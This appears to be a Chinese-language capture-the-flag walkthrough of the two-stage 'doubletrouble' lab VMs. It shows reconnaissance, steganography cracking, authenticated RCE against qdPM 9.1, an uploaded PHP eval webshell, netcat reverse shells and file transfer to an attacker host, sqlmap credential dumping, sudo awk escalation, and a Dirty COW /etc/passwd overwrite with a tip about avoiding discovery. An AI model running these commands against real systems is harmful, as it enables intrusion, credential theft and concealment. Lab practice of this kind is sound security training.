@@ -1,0 +1,300 @@
+#ip 
+192.168.1.24
+
+#nmap扫描
+nmap -sS -P0 -A 192.168.1.24
+# 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+# | ssh-hostkey: 
+# |   2048 6afed61723cb90792bb12d3753974658 (RSA)
+# |   256 5bc468d18959d748b096f311871c08ac (ECDSA)
+# |_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
+# 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+# |_http-title: qdPM | Login
+# |_http-server-header: Apache/2.4.38 (Debian)
+# MAC Address: 08:00:27:DD:6F:73 (Oracle VirtualBox virtual NIC)
+
+#dirsearch扫描网站目录
+dirsearch -u http://192.168.1.24/ 
+# [19:27:56] 301 -  314B  - /backups  ->  http://192.168.1.24/backups/        
+# [19:27:56] 200 -  743B  - /backups/                                         
+# [19:27:56] 200 -    0B  - /check.php                                        
+# [19:27:57] 301 -  311B  - /core  ->  http://192.168.1.24/core/              
+# [19:27:57] 301 -  310B  - /css  ->  http://192.168.1.24/css/                
+# [19:27:59] 200 -  894B  - /favicon.ico                                      
+# [19:28:00] 301 -  313B  - /images  ->  http://192.168.1.24/images/          
+# [19:28:00] 200 -    2KB - /images/                                          
+# [19:28:00] 200 -    6KB - /index.php                                        
+# [19:28:00] 200 -    7KB - /index.php/login/                                 
+# [19:28:00] 301 -  314B  - /install  ->  http://192.168.1.24/install/        
+# [19:28:00] 200 -    2KB - /install/                                         
+# [19:28:00] 200 -    2KB - /install/index.php?upgrade/
+# [19:28:00] 200 -    2KB - /js/                                              
+# [19:28:04] 200 -  470B  - /readme.txt                                       
+# [19:28:05] 200 -   26B  - /robots.txt                                       
+# [19:28:05] 301 -  313B  - /secret  ->  http://192.168.1.24/secret/          
+# [19:28:05] 200 -  955B  - /secret/
+# [19:28:05] 403 -  277B  - /server-status                                    
+# [19:28:05] 403 -  277B  - /server-status/                                   
+# [19:28:07] 301 -  315B  - /template  ->  http://192.168.1.24/template/      
+# [19:28:07] 200 -    2KB - /template/                                        
+# [19:28:08] 301 -  314B  - /uploads  ->  http://192.168.1.24/uploads/        
+# [19:28:08] 200 -    1KB - /uploads/   
+
+#查看首页
+http://192.168.1.24
+# qdPM 9.1 版本
+
+#挨个访问扫描的目录和文件，发现有一张图片，下载下来
+wget http://192.168.1.24/secret/doubletrouble.jpg
+
+#steghide 查看文件是否有隐藏信息
+steghide info doubletrouble.jpg #存在隐藏信息，
+
+#使用stegseek破解图片的隐藏密码
+stegseek --crack doubletrouble.jpg
+# StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+# [i] Found passphrase: "92camaro"        
+# [i] Original filename: "creds.txt".
+# [i] Extracting to "doubletrouble.jpg.out".
+
+#目录下生产 doubletrouble.jpg.out
+cat doubletrouble.jpg.out  #直接找出了用户名和密码
+#用户名： otisrush@localhost.com
+#密码： otis666 
+
+#用上面的用户名和密码 登录网站
+http://192.168.1.24/index.php/login
+#登录成功，是管理员用户
+
+#这里有两种方法，去获得webshell，两个方法获得的都是www-data
+getshell 方法1:
+#使用 cve-2020-7246-v2.py 远程代码执行漏洞（需要用普通权限的用户才能执行脚本）
+
+#在页面上 创建普通用户帐号
+用户名： momoda@localhost.com
+密码： momoda
+
+#搜索漏洞
+searchexploit qdpm 9.1
+qdPM 9.1 - Remote Code Execution (Authenticated)               | php/webapps/50175.py
+qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)    | php/webapps/50944.py
+
+#这里使用 v2版本，复制到当前目录下
+cve-2020-7246-v2.py
+
+#payload攻击
+python3 cve-2020-7246-v2.py -url http://192.168.1.24 -u momoda@localhost.com -p momoda
+
+#攻击成功会在 http://192.168.1.24/uploads/users/ 生成一个shell文件
+642541-backdoor.php
+# The DateStamp is 2023-04-22 09:22 
+# The DateStamp is 2023-04-22 10:29 
+# Backdoor uploaded at - > http://192.168.1.24/uploads/users/642541-backdoor.php?cmd=whoami
+
+#访问 给出的链接地址
+http://192.168.1.24/uploads/users/642541-backdoor.php?cmd=whoami
+# www-data
+#获取webshell成功
+
+#kali攻击机 监听4444
+nv -lvnp 4444
+
+#访问链接地址
+http://192.168.1.24/uploads/users/642541-backdoor.php?cmd=nc -e /bin/sh 192.168.1.15 4444 
+# nc -c /bin/sh 192.168.1.15 4444  都可以连接
+
+#稳定shell
+export TERM=xterm
+python3 -c "import pty;pty.spawn('/bin/bash')"
+#www-data@doubletrouble:/var/www/html/uploads/users$ 
+#webshell 获得成功
+
+getshell 方法2:
+#在管理员个人资料页面，通过图片上传功能，没有任何校验
+
+#创建个 shell.php
+<?php @eval($_REQUEST['angel']);?>
+
+#直接上传上去 会在 http://192.168.1.24/uploads/users/ 生成一个shell文件
+615655-shell.php
+
+#蚁剑连接成功
+http://192.168.1.24/uploads/users/615655-shell.php
+密码： angel
+
+#打开一个终端窗口 id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+#将shell 转移到 kali攻击机
+#在kali攻击机 开启监听
+nc -lvnp 4446
+
+#在蚁剑终端窗口执行,都可以连接
+nc 192.168.1.15 4446 -e /bin/sh
+nc -c /bin/sh 192.168.1.15 4446
+
+#稳定shell
+export TERM=xterm
+python3 -c "import pty;pty.spawn('/bin/bash')"
+#www-data@doubletrouble:/var/www/html/uploads/users$
+#webshell 获取成功
+
+root提权:
+#查看当前 www-data 可执行的系统命令
+sudo -l
+# Matching Defaults entries for www-data on doubletrouble:
+#     env_reset, mail_badpass,
+#     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+# User www-data may run the following commands on doubletrouble:
+#    (ALL : ALL) NOPASSWD: /usr/bin/awk
+
+# 发现可执行 awk 命令，不用sudo密码
+NOPASSWD /usr/bin/awk #(ALL : ALL) 
+
+#在 https://gtfobins.github.io/  查看awk的提权方法
+awk - sudo
+
+#使用awk命令 sudo方式 提权
+sudo awk 'BEGIN {system("/bin/bash")}'
+# root@doubletrouble:/var/www/html/uploads/users#
+
+#www-data  ->  root   提权成功
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+#查看/root的 root flag文件
+cd /root
+ls -alh
+# drwx------  2 root root 4.0K Sep 11  2021 .
+# drwxr-xr-x 18 root root 4.0K Dec 17  2020 ..
+# -rw-------  1 root root   46 Sep 11  2021 .bash_history
+# -rw-r--r--  1 root root 395M Sep 11  2021 doubletrouble.ova
+
+#发现另一个虚拟机，使用命令 nc进行下载到kali攻击机
+#kali攻击机开启监听  
+nc -lvnp 4446 > doubletrouble.ova
+#目标机执行  
+nc -nv 192.168.1.15 4446 < doubletrouble.ova -q 1
+
+#第一阶段全部完成，在kali上开启第二个虚拟机
+
+
+
+########################### doubletrouble 第二个虚拟机  ############################
+#ip 
+192.168.1.25
+
+#nmap扫描
+nmap -sS -P0 -A 192.168.1.25
+# PORT   STATE SERVICE VERSION
+# 22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u4 (protocol 2.0)
+# | ssh-hostkey: 
+# |   1024 e84f84fc7a20378b2bf314a9549eb70f (DSA)
+# |   2048 0c1050f5a2d874f194c560d71a78a4e6 (RSA)
+# |_  256 050395760c7facdbb299137e9c26cad1 (ECDSA)
+# 80/tcp open  http    Apache httpd 2.2.22 ((Debian))
+# |_http-title: Site doesn't have a title (text/html).
+# |_http-server-header: Apache/2.2.22 (Debian)
+# MAC Address: 08:00:27:2A:55:9E (Oracle VirtualBox virtual NIC)
+# Device type: general purpose
+# Running: Linux 3.X
+# OS CPE: cpe:/o:linux:linux_kernel:3
+# OS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16
+# Network Distance: 1 hop
+# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+#dirsearch 扫描
+dirsearch -u http://192.168.1.25
+# [20:56:10] 200 -  615B  - /index.php                                        
+# [20:56:10] 200 -  615B  - /index.php/login/                                 
+# [20:56:15] 403 -  294B  - /server-status/                                   
+# [20:56:15] 403 -  293B  - /server-status
+
+#查看登录页面，post请求，sqlmap扫描
+sqlmap -r test.txt -D doubletrouble -T users --dump --batch
+# POST /index.php/login HTTP/1.1
+# Host: 192.168.1.25
+# User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+# Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+# Accept-Encoding: gzip, deflate
+# Content-Type: application/x-www-form-urlencoded
+# Content-Length: 36
+# Origin: http://192.168.1.25
+# DNT: 1
+# Connection: close
+# Referer: http://192.168.1.25/index.php/index.php
+# Upgrade-Insecure-Requests: 1
+
+# uname=admin&psw=admin&btnLogin=Login
+
+#扫出的用户名和密码
++----------+----------+
+| username | password |
++----------+----------+
+| montreux | GfsZxc1  |
+| clapton  | ZubZub99 |
++----------+----------+
+#页面都无法登录
+
+#尝试 ssh 去连接
+ssh montreux@192.168.1.25 #登录失败
+密码： GfsZxc1
+
+#尝试 ssh 去连接
+ssh clapton@192.168.1.25 #登录成功
+密码： ZubZub99
+# clapton@doubletrouble:~$ 
+
+#查看当前用户目录，获得 user flag
+6CEA7A737C7C651F6DA7669109B5FB52
+
+root提权:
+#查看内核版本
+unama -a
+#Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
+
+#searchexploit 查找漏洞
+searchexploit linux 3.2.0
+#dirty cow (脏牛提权漏洞 https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+#复制下来 cve-2016-5915-v2.c
+
+#cve-2016-5195.c 脏牛提权漏洞的另一个版本
+直接将当前用户提权为 root
+
+#靶机 下载 复制下来 cve-2016-5915-v2.c
+wget http://192.168.1.15:8083/cve-2016-5915-v2.c
+
+#编译 执行
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty 123456(密码)
+
+#创建一个root用户
+firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash
+#重写 /etc/passwd
+#记得要恢复，不然会被发现
+mv /tmp/passwd.bak /etc/passwd
+
+#切换root用户 firefart
+su firefart
+密码： 123456
+#firefart@doubletrouble:/home/clapton#
+
+#或者 ssh 连接
+ssh firefart@192.168.1.25
+密码： 123456
+
+#获取root flag
+1B8EEA89EA92CECB931E3CC25AA8DE2
+
+#第二阶段全部完成
+
+#两台靶机全部拿下 root
+
+
+
+
+
+
